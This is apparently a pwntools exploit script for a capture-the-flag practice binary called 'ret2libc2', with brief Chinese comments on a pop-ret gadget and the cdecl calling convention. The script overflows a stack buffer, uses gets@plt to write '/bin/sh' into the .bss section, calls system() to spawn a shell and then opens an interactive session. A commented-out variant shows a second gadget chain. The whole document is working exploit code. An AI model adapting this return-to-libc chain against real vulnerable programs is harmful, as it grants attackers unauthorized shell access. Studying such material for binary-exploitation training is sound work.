from pwn import *

sh = process('./ret2libc2')
system_addr = 0x08048490
bss_addr = 0x0804A080
gets_plt = 0x08048460
# 也可以用pop|ret
pop_ebx_ret = 0x0804843d

payload = b'a'*112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(bss_addr)
# payload = b'a'*112 + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss_addr) + p32(system_addr) + p32(0xdeadbeef) +p32(bss_addr)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

# cdecl函数调用约定